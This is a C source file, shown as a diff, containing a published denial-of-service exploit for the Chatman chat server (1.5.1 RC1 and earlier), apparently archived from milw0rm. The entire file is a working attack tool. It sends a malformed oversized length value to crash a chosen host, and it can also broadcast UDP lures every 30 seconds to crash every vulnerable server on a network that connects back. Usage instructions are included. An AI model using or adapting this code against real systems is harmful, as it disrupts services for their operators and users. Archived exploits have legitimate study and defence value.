@@ -1,0 +1,322 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#ifdef WIN32
+    #include <winsock.h>
+#include <string.h>
+#include <errno.h>
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = "Interrupted system call"; break;
+        case 10009: error = "Bad file number"; break;
+        case 10013: error = "Permission denied"; break;
+        case 10014: error = "Bad address"; break;
+        case 10022: error = "Invalid argument (not bind)"; break;
+        case 10024: error = "Too many open files"; break;
+        case 10035: error = "Operation would block"; break;
+        case 10036: error = "Operation now in progress"; break;
+        case 10037: error = "Operation already in progress"; break;
+        case 10038: error = "Socket operation on non-socket"; break;
+        case 10039: error = "Destination address required"; break;
+        case 10040: error = "Message too long"; break;
+        case 10041: error = "Protocol wrong type for socket"; break;
+        case 10042: error = "Bad protocol option"; break;
+        case 10043: error = "Protocol not supported"; break;
+        case 10044: error = "Socket type not supported"; break;
+        case 10045: error = "Operation not supported on socket"; break;
+        case 10046: error = "Protocol family not supported"; break;
+        case 10047: error = "Address family not supported by protocol family"; break;
+        case 10048: error = "Address already in use"; break;
+        case 10049: error = "Can't assign requested address"; break;
+        case 10050: error = "Network is down"; break;
+        case 10051: error = "Network is unreachable"; break;
+        case 10052: error = "Net dropped connection or reset"; break;
+        case 10053: error = "Software caused connection abort"; break;
+        case 10054: error = "Connection reset by peer"; break;
+        case 10055: error = "No buffer space available"; break;
+        case 10056: error = "Socket is already connected"; break;
+        case 10057: error = "Socket is not connected"; break;
+        case 10058: error = "Can't send after socket shutdown"; break;
+        case 10059: error = "Too many references, can't splice"; break;
+        case 10060: error = "Connection timed out"; break;
+        case 10061: error = "Connection refused"; break;
+        case 10062: error = "Too many levels of symbolic links"; break;
+        case 10063: error = "File name too long"; break;
+        case 10064: error = "Host is down"; break;
+        case 10065: error = "No Route to Host"; break;
+        case 10066: error = "Directory not empty"; break;
+        case 10067: error = "Too many processes"; break;
+        case 10068: error = "Too many users"; break;
+        case 10069: error = "Disc Quota Exceeded"; break;
+        case 10070: error = "Stale NFS file handle"; break;
+        case 10091: error = "Network SubSystem is unavailable"; break;
+        case 10092: error = "WINSOCK DLL Version out of range"; break;
+        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+        case 10071: error = "Too many levels of remote in path"; break;
+        case 11001: error = "Host not found"; break;
+        case 11002: error = "Non-Authoritative Host not found"; break;
+        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+        case 11004: error = "Valid name, no data record of requested type"; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, "\nError: %s\n", error);
+    exit(1);
+}
+
+
+    #define close   closesocket
+    #define ONESEC  1000
+    #define TWAIT   30000
+    DWORD   tid1;
+    HANDLE  thandle;
+    #define launch_thread(FUNCTION, PARAMETER) \
+        thandle = CreateThread(NULL, 0, (void *)&FUNCTION, (void *)PARAMETER, 0, &tid1); \
+        if(!thandle)
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netdb.h>
+    #include <netinet/in.h>
+    #include <pthread.h>
+
+    #define ONESEC  1
+    #define TWAIT   30
+    pthread_t   tid1;
+    int         thandle;
+    #define launch_thread(FUNCTION, PARAMETER) \
+        thandle = pthread_create(&tid1, NULL, (void *)&FUNCTION, (void *)PARAMETER); \
+        if(thandle)
+#endif
+
+
+
+#define VER     "0.1"
+#define PORT    7779
+#define JOIN    "/TS\r" "crash"
+#define BOOM    "\x00\x00\x00\x7f"
+    // the cause of the bug is a too big 32 bit value
+    // so the allocation fails and the host exits
+    // note, are made some operations on this number
+    // by the target host
+
+
+#ifdef WIN32
+    DWORD WINAPI broadjoin(void);
+    DWORD WINAPI client(int sock);
+#else
+    void *broadjoin(void);
+    void *client(int sock);
+#endif
+u_long resolv(char *host);
+void std_err(void);
+
+
+
+u_long  broadip = 0xffffffffL;
+
+
+
+int main(int argc, char *argv[]) {
+    struct  sockaddr_in peer;
+    int     sd,
+            sa,
+            type,
+            on = 1,
+            psz;
+
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "Chatman <= 1.5.1 RC1 broadcast crash "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@altervista.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 2) {
+        printf("\n"
+            "Usage: %s <d/p> [host]\n"
+            "\n"
+            "d = direct, you must specify the host to crash\n"
+            "    Example: %s d localhost\n"
+            "p = passive broadcast crash, any Chatman host reacheable by 255.255.255.255\n"
+            "    (or any other address choosen by you) will be passively crashed.\n"
+            "    Examples: %s p\n"
+            "              %s p 227.0.0.2\n"
+            "              %s p 127.0.0.1\n"
+            "\n", argv[0], argv[0], argv[0], argv[0], argv[0]);
+        exit(1);
+    }
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+    type = argv[1][0];
+    if((type != 'd') && (type != 'p')) {
+        fputs("\nError: You must choose between 'd' or 'p'\n", stdout);
+        exit(1);
+    }
+
+    if(type == 'd') {
+        if(argc < 3) {
+            fputs("\nError: you must specify the host to crash\n", stdout);
+            exit(1);
+        }
+        peer.sin_addr.s_addr = resolv(argv[2]);
+        printf("- target   %s:%hu\n",
+            inet_ntoa(peer.sin_addr),
+            PORT);
+    } else {
+        if(argc > 2) broadip = resolv(argv[2]);
+        peer.sin_addr.s_addr = INADDR_ANY;
+        psz                  = sizeof(peer);
+        printf("- target   %s (UDP %d, bind %d)\n",
+            inet_ntoa(*(struct in_addr *)&broadip),
+            PORT - 1,
+            PORT);
+    }
+    peer.sin_port   = htons(PORT);
+    peer.sin_family = AF_INET;
+
+    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if(sd < 0) std_err();
+
+    if(type == 'd') {
+        if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
+          < 0) std_err();
+
+        fputs("- send BOOM data\n", stdout);
+        if(send(sd, BOOM, sizeof(BOOM) - 1, 0)
+          < 0) std_err();
+        fputs("- the host should be crashed, check it manually\n", stdout);
+
+    } else {
+        fputs(
+            "- launch the broad ping, the tool will automatically and passively crash any\n"
+            "  vulnerable Chatman host each 30 seconds (so it runs infinitely until you\n"
+            "  stop it).\n", stdout);
+
+        launch_thread(broadjoin, NULL) {
+            fputs("\nError: Cannot create the thread\n", stdout);
+            exit(1);
+        }
+
+        fputs("- bind TCP port to accept connections to crash hosts\n", stdout);
+    	if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
+    	  < 0) std_err();
+        if(bind(sd, (struct sockaddr *)&peer, sizeof(peer))
+    	  < 0) std_err();
+        if(listen(sd, 5)
+          < 0) std_err();
+
+        for(;;) {
+            sa = accept(sd, (struct sockaddr *)&peer, &psz);
+            if(sa < 0) std_err();
+
+            printf("Host %s:%hu -> BOOM\n",
+                inet_ntoa(peer.sin_addr),
+                ntohs(peer.sin_port));
+
+            launch_thread(client, sa) {
+                fputs("\nError: Cannot create the thread\n", stdout);
+                exit(1);
+            }
+        }
+    }
+
+    close(sd);
+    return(0);
+}
+
+
+
+#ifdef WIN32
+    DWORD WINAPI broadjoin(void) {
+#else
+    void *broadjoin(void) {
+#endif
+    int                 sd,
+                        on = 1;
+    struct  sockaddr_in peer;
+
+    peer.sin_addr.s_addr = broadip;
+    peer.sin_port        = htons(PORT - 1); // 7778
+    peer.sin_family      = AF_INET;
+
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+
+    if(setsockopt(sd, SOL_SOCKET, SO_BROADCAST, (char *)&on, sizeof(on))
+      < 0) std_err();
+
+    fputs("- send broadcast UDP join packet (each 30 seconds)\n", stdout);
+
+    for(;;) {
+        if(sendto(sd, JOIN, sizeof(JOIN) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
+          < 0) std_err();
+        fputs(".\n", stdout);
+        sleep(TWAIT);
+    }
+
+    close(sd);
+    return(0);
+}
+
+
+
+#ifdef WIN32
+    DWORD WINAPI client(int sock) {
+#else
+    void *client(int sock) {
+#endif
+    if(send(sock, BOOM, sizeof(BOOM) - 1, 0)
+      < 0) std_err();
+    sleep(ONESEC);  // needed!
+    close(sock);
+    return(0);
+}
+
+
+
+u_long resolv(char *host) {
+    struct  hostent *hp;
+    u_long  host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolve hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u_long *)hp->h_addr;
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+// milw0rm.com [2004-03-01]
